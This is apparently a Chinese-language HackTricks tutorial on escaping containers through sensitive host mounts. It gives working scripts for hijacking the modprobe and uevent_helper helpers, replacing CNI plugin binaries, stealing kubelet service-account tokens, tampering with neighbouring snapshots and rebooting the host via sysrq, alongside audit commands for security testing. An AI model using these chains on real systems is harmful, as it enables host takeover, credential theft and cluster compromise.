# 敏感 Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Host mounts 是最重要的实际 container-escape attack surface 之一，因为它们经常会将原本经过精心隔离的 process view 重新暴露为对 host resources 的直接可见性。危险情况并不局限于 `/`。对 `/proc`、`/sys`、`/var`、runtime sockets、kubelet-managed state 或 device-related paths 的 bind mounts，可能暴露 kernel controls、credentials、neighboring container filesystems 以及 runtime management interfaces。

本页面独立于各个 protection pages 存在，因为其 abuse model 横跨多个方面。一个 writable host mount 之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux coverage，还有部分原因在于具体暴露的是哪个 host path。将其作为独立主题处理，可以更容易地分析整个 attack surface。

## `/proc` 暴露

procfs 同时包含普通 process information 和高影响力的 kernel control interfaces。因此，类似 `-v /proc:/host/proc` 的 bind mount，或暴露了意外 writable proc entries 的 container view，可能导致 information disclosure、denial of service 或直接的 host code execution。

高价值的 procfs paths 包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/`（尤其是 `register` 和 `status`）
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

首先检查哪些高价值 procfs entries 可见或可写：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径之所以值得关注，原因各不相同。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为指向 host 的 code-execution 路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时强大的 reconnaissance 来源。`sched_debug` 和 `mountinfo` 会暴露进程、cgroup 以及 filesystem 上下文，有助于从 container 内部重建 host 布局。

每个路径的实际价值各不相同，如果将它们视为具有相同影响，会增加 triage 的难度：

- `/proc/sys/kernel/core_pattern`
如果可写，这是 procfs 中影响最大的路径之一，因为 kernel 会在发生 crash 后执行 pipe handler。能够将 `core_pattern` 指向存储在其 overlay 或已挂载 host 路径中的 payload 的 container，通常可以获得 host code execution。另请参阅 [read-only-paths.md](protections/read-only-paths.md) 中的专门示例。
- `/proc/sys/kernel/modprobe`
此路径控制 kernel 在需要调用 module-loading 逻辑时使用的 userspace helper。如果 container 可写入该路径，并且该路径在 host 上下文中被解释，它可能成为另一种 host code-execution primitive。当存在触发该 helper 路径的方法时，它尤其值得关注。
- `/proc/sys/vm/panic_on_oom`
这通常不是一种干净的 escape primitive，但可以将内存压力转化为 host-wide denial of service，将 OOM 条件转变为 kernel panic 行为。
- `/proc/sys/fs/binfmt_misc`
如果 registration interface 可写，attacker 可能为指定的 magic value 注册 handler，并在执行匹配文件时获得 host-context execution。
- `/proc/config.gz`
对 kernel exploit triage 很有用。无需 host package metadata，它即可帮助确定启用了哪些 subsystem、mitigation 和可选 kernel feature。
- `/proc/sysrq-trigger`
主要是 denial-of-service 路径，但影响非常严重。它可以立即 reboot、panic 或以其他方式干扰 host。
- `/proc/kmsg`
会暴露 kernel ring buffer 消息。可用于 host fingerprinting、crash analysis，并且在某些环境中可 leak 对 kernel exploitation 有帮助的信息。
- `/proc/kallsyms`
可读时价值很高，因为它会暴露 exported kernel symbol 信息，并可能帮助在 kernel exploit 开发期间绕过对 address randomization 的假设。
- `/proc/[pid]/mem`
这是一个直接的进程内存 interface。如果能够在满足必要 ptrace-style 条件的情况下访问目标进程，可能允许读取或修改其他进程的内存。实际影响在很大程度上取决于 credentials、`hidepid`、Yama 和 ptrace restrictions，因此这是一个强大但有条件的路径。
- `/proc/kcore`
会暴露类似 core image 的 system memory 视图。该文件非常大且难以使用，但如果它实际上可读，则表明 host memory surface 暴露严重。
- `/dev/kmem` 和 `/dev/mem`
这些是历史上影响很大的原始内存 **device** interface，而不是 procfs 文件。在许多现代 system 上，它们不存在或受到严格限制，但如果 container 能够打开 host-mounted copy，应将此暴露视为 critical。应将它们与其他敏感 `/dev` mount 一起审查，而不是搜索不存在的 `/proc/kmem` 或 `/proc/mem` 路径。
- `/proc/sched_debug`
会 leak scheduling 和 task 信息，即使其他 process view 看起来比预期更干净，也可能暴露 host process identity。
- `/proc/[pid]/mountinfo`
对于重建 container 在 host 上的实际位置、确定哪些路径由 overlay 提供支持，以及判断某个 writable mount 对应的是 host content 还是仅对应 container layer，都非常有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 细节可读，请使用它们恢复 container filesystem 在 host 上的路径：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧都需要将容器内的路径转换为从 host 视角对应的路径。

### 示例：准备一个 `modprobe` Helper 路径

如果 `/proc/sys/kernel/modprobe` 可从容器内写入，并且 Helper 路径会在 host 上下文中解析，那么它可以被重定向到攻击者控制的 payload。Overlay upper 目录必须从 host 解析；如果容器没有同时挂载 host 的 `/tmp`，则证明输出也必须写回同一个从 host 可见的容器层：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
具体触发条件取决于目标和 kernel 行为，这里有意不进行猜测。离开实验环境前请恢复原始值。关键在于，可写的 helper 路径能够将未来的 kernel helper 调用重定向到由攻击者控制的 host-path 内容。缺少 overlay `upperdir`、host 无法解析的路径、只读的 sysctl 挂载，或 kernel 从未调用所选 helper，都会中断这条链。

### 完整示例：使用 `kallsyms`、`kmsg` 和 `config.gz` 进行 kernel Recon

如果目标是评估 exploitability，而不是立即 escape：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于判断是否可以看到有用的符号信息、近期的 kernel 消息是否泄露了有价值的状态，以及编译时是否启用了某些 kernel 功能或缓解措施。其影响通常不是直接 escape，但可以显著缩短 kernel 漏洞分诊时间。

### 完整示例：SysRq Host Reboot

如果 `/proc/sysrq-trigger` 可写，并且能够访问 host 视图：
```bash
echo b > /proc/sysrq-trigger
```
其效果是主机立即重启。这不是一个隐蔽的示例，但它清楚地表明，procfs 暴露的严重性可能远不止信息泄露。

## `/sys` 暴露

sysfs 暴露大量内核和设备状态。一些 sysfs 路径主要用于指纹识别，而其他路径则可能影响 helper 执行、设备行为、安全模块配置或固件状态。

高价值的 sysfs 路径包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径的重要性各不相同。`/sys/class/thermal` 可能影响 thermal-management 行为，因此在暴露不当的环境中影响主机稳定性。`/sys/kernel/vmcoreinfo` 可能泄露 crash-dump 和内核布局信息，从而帮助进行低级别的主机指纹识别。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此对其进行意外访问可能暴露或修改与 MAC 相关的状态。EFI 变量路径可能影响由固件支持的启动设置，因此其严重性远高于普通配置文件。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本质上是面向开发者的接口，其安全保障预期远少于面向生产环境且经过加固的内核 API。

此列表中的每个 sysfs 条目都**取决于内核、配置和硬件**。当前的虚拟化节点通常会完全省略 `uevent_helper`、EFI 变量和 thermal-device 条目。将缺失的路径记录为否定前置条件，而不要假设其他内核中的示例同样适用。

用于检查这些路径的实用命令如下：
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
这些命令为何值得关注：

- `/sys/kernel/security` 可能暴露 AppArmor、SELinux 或其他 LSM surface，表明本应仅对 host 可见的内容被暴露出来。
- `/sys/kernel/debug` 通常是这一组中最令人担忧的发现。如果已挂载 `debugfs` 且可读或可写，应预期存在一个广泛的 kernel-facing surface；其确切风险取决于已启用的 debug nodes。
- EFI variable 暴露较为少见，但影响很大，因为它涉及由 firmware 支持的设置，而不是普通的 runtime files。
- `/sys/class/thermal` 主要与 host 稳定性和硬件交互有关，而不是用于实现典型的 shell-style escape。
- `/sys/kernel/vmcoreinfo` 主要是 host-fingerprinting 和 crash-analysis 的信息源，有助于了解低级别的 kernel state。

### 完整示例：`uevent_helper`

`/sys/kernel/uevent_helper` 取决于 kernel 和 configuration，在许多当前系统中并不存在。如果它存在、可写，并且有可用的 `uevent` trigger，kernel 可能会执行由 attacker 控制的 helper。Proof output 必须使用一个从 host 和 container 视图都可见的路径：
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
之所以有效，是因为 helper path 会从 host 的视角进行解析。触发后，helper 会在 host context 中运行，而不是在当前 container 内运行。对于会暴露该接口的 kernel，`/sys/class/mem/null/uevent` 是一个具体的 trigger；其他设备也可能暴露各自的 `uevent` 文件，但不要在真实 hardware 上盲目选择。离开 lab 前恢复原始值。如果 helper 文件或受控 trigger 不存在，不要报告该 technique 可用。

## `/var` 暴露

将 host 的 `/var` 挂载到 container 中通常会被低估，因为它不像挂载 `/` 那样显眼。实际上，这通常足以访问 runtime sockets、container snapshot 目录、kubelet 管理的 pod volumes、projected service-account tokens，以及相邻的 application filesystems。在现代 node 上，`/var` 往往是最有 operational value 的 container state 所在的位置。

### Kubernetes 示例

使用 `hostPath: /var` 的 pod 通常可以读取其他 pod 的 projected tokens 和 overlay snapshot 内容：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们可以回答该 mount 仅暴露无关紧要的应用数据，还是暴露了高影响力的 cluster 凭据。可读取的 service-account token 可能会立即将本地 code execution 转化为 Kubernetes API 访问权限。

如果存在该 token，应验证它能够访问哪些内容，而不是在发现 token 后就停止：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远大于 local node access。具有广泛 RBAC 权限的 token 可以将挂载的 `/var` 变成对整个集群的 compromise。

### Docker 和 containerd 示例

在 Docker hosts 上，相关数据通常位于 `/var/lib/docker` 下；而在由 containerd 支持的 Kubernetes nodes 上，相关数据可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个 workload 的可写 snapshot 内容，攻击者可能无需接触当前 container 配置，就能修改 application 文件、植入 web 内容或更改 startup scripts。

在**一次性 lab workload**中，可写的 snapshot 内容可以用于演示 application 篡改、secret 恢复或 lateral movement。首先将 runtime container ID 映射到确切的 snapshot，绝不要编辑无关的或 production snapshot：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
这些命令很有用，因为它们展示了挂载 `/var` 的三类主要影响：应用篡改、secret 恢复，以及向相邻 workload 进行 lateral movement。

直接写入 snapshot 会绕过 runtime 的正常状态管理，可能破坏 container 或销毁证据。我们在本地针对 Docker `overlay2` 重现了只读发现：在相邻的 disposable container 中写入的 marker 出现在 `/var/lib/docker/overlay2/<id>/diff/` 下。实际的 snapshot 修改应仅限于为该测试创建的 disposable container。

## Kubelet State、Plugins 和 CNI 路径

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 通常通过 privileged DaemonSets、CNI agents、CSI node plugins、GPU operators 和 storage helpers 暴露。这些挂载很容易被认为只是“node plumbing”，但它们直接处于新 pod 的执行路径中，并且通常包含 kubelet credentials、projected secrets、registration sockets 以及可执行的 host-side plugin binaries。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用的审查命令包括：
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
为什么这些路径很重要：

- `/var/lib/kubelet/pki` 可能暴露 kubelet client certificates 以及其他节点本地凭据；根据集群设计，这些凭据有时可被复用于 API server 或面向 kubelet 的 TLS endpoints。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` 通常包含同一节点上其他 pod 的 projected service-account tokens 和挂载的 Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance surface，但非常有用：它可以揭示当前哪些 pods 和 containers 正在占用 GPUs、hugepages、SR-IOV devices 以及其他稀缺的节点本地资源。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 可以揭示已安装的 CSI、DRA 和 device plugins，以及 kubelet 预计需要连接的 sockets。如果这些目录是可写的，而不仅仅是可读的，那么问题的严重性会大幅提升。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接处于 pod-network setup path 上。对这些路径的可写访问通常意味着一种延迟的 host-execution primitive，而不仅仅是配置暴露。<sup>[[2]](#references)</sup>

### 完整示例：可写的 `/opt/cni/bin`

如果主机 CNI binary directory 以 read-write 方式挂载，那么替换某个 plugin 可能就足以在 kubelet 下次于该节点创建 pod sandbox 时获得 host execution：<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
这不像挂载 `docker.sock` 那样直接，但在遭到入侵的 Kubernetes infrastructure pods 中，这种情况往往更现实。标记会写入挂载的 plugin 旁边，因此即使没有 host-root 或 host-`/tmp` 挂载，container 也能取回它。wrapper 会保留原始参数和 standard input，然后示例会恢复原始 binary。关键点在于，修改后的 binary 随后由 host network setup flow 执行，而不是由当前 container 执行。只能使用 disposable node，因为无效的 wrapper 可能会导致新的 Pod sandboxes 无法获得 networking。

## Runtime Sockets

敏感的 host mounts 通常包含 runtime sockets，而不是完整目录。这些 socket 非常重要，因此值得在此明确重复：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
有关挂载其中一个 socket 后的完整 exploitation 流程，请参阅 [runtime API and daemon exposure](runtime-api-and-daemon-exposure.md)。

作为一种快速的初始交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中任何一种方式成功，从“已挂载的 socket”到“启动一个权限更高的 sibling container”的路径，通常都比任何 kernel breakout 路径短得多。

## 可写主机路径任务劫持

可写的主机挂载不需要暴露 `/` 才会带来危险。如果挂载路径包含脚本、配置文件、hooks、plugins，或包含稍后由主机侧 scheduled task 或 service 使用的文件，则 container 可能能够修改主机执行的内容。

通用审查流程：
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
如果可写文件会被 host process 使用，测试时请让 payload 保持简单且可观测：
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
有趣的部分在于信任边界：写入操作发生在 container 内部，但执行会在 host service 上下文中稍后发生。这会将一个范围狭窄的 hostPath 或 bind mount 转化为一种延迟的 host code execution 原语。

## 与挂载相关的 CVE

Host mount 也会与 runtime 漏洞产生交集。近期的重要示例包括：

- `CVE-2024-21626` 存在于 `runc` 中，泄露的目录文件描述符可能会将工作目录置于 host 文件系统上。
- `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653` 存在于 BuildKit 中，恶意 Dockerfile、frontend 以及 `RUN --mount` 流程可能在构建期间重新引入 host 文件访问、删除或提升的权限。
- `CVE-2024-1753` 存在于 Buildah 和 Podman build 流程中，构造的 bind mount 可能在构建期间暴露可读写的 `/`。
- `CVE-2025-47290` 存在于 `containerd` 2.1.0 中，image unpack 期间的 TOCTOU 可能允许特制 image 在 pull 期间修改 host 文件系统。

这些 CVE 在此处很重要，因为它们表明，挂载处理不仅与 operator 配置有关。runtime 本身也可能引入由挂载驱动的 escape 条件。

## 检查

使用以下命令快速定位价值最高的挂载暴露：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里有什么值得关注：

- Host root、`/proc`、`/sys`、`/var` 以及 runtime sockets 都是高优先级发现项。
- 可写的 proc/sys 条目通常意味着该挂载暴露的是主机全局 kernel controls，而不是安全的 container view。
- 挂载的 `/var` 路径不仅需要进行文件系统审查，还应检查 credential 和相邻 workload。
- Kubelet 状态目录以及 CNI/plugin 路径应与 runtime sockets 享有同等优先级，因为它们通常直接位于节点的 pod-creation 和 credential-distribution 路径上。

## Local Validation Status

本页中的实际链路已在本地 Linux minikube 节点上进行检查。验证复现了：

- 通过临时的可写 hostPath 进行读写访问
- 通过 `/var/lib/kubelet/pods` 发现 projected ServiceAccount tokens 和挂载的 Secrets
- 使用从该挂载的 kubelet 状态中恢复的 live token 成功进行 Kubernetes API authentication
- 通过挂载的 `/var` 只读发现相邻 Docker `overlay2` filesystem
- 通过挂载的 `docker.sock` 创建带有只读 host bind 的 sibling container
- 通过临时的 host-consumed hook 延迟执行 host 操作
- 对 CNI-wrapper 进行模拟，同时保留原始 plugin 的 arguments、standard input 和 execution

同一节点暴露了 `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore` 和 `config.gz`，但未暴露 `uevent_helper`、EFI variables、thermal entries 或 `sched_debug`。未执行破坏性的 kernel triggers。这确认了 host-root、`/var`、kubelet-state、socket 以及 host-consumer 链路均可复现，而 procfs/sysfs helper techniques 必须根据确切的 kernel、mount mode、payload path 和 trigger 进行条件判断。

## References

- [1] [Kubelet 使用的本地文件和路径](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container 可通过 `hostPath` mount 访问 host](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
